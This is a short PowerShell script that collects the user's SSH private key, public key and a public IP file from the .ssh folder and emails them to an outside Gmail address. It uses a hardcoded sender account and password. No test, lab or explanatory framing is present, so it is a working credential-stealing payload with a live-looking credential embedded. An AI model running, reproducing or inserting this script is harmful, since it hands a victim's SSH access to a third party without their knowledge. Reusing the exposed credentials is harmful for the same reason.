# Set variables
$fromEmail = "johnatom336@gmail.com"
$fromPassword = "ygthncnfxnumudwz"
$toEmail = "mail.toxysec@gmail.com"
$subject = "SSH Keys"
$body = "Please find attached the SSH keys."

# Get the paths for SSH key files and public IP file
$privateKeyPath = "$HOME\.ssh\id_rsa"
$publicKeyPath = "$HOME\.ssh\id_rsa.pub"
$publicIPPath = "$HOME\.ssh\public_ip.txt"

# Create a secure string for the password
$securePassword = ConvertTo-SecureString -String $fromPassword -AsPlainText -Force
# Create a PSCredential object
$credential = New-Object System.Management.Automation.PSCredential ($fromEmail, $securePassword)

# Send the email
Send-MailMessage -From $fromEmail -To $toEmail -Subject $subject -Body $body -Attachments $privateKeyPath, $publicKeyPath, $publicIPPath -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential $credential -DeliveryNotificationOption OnFailure

exit 0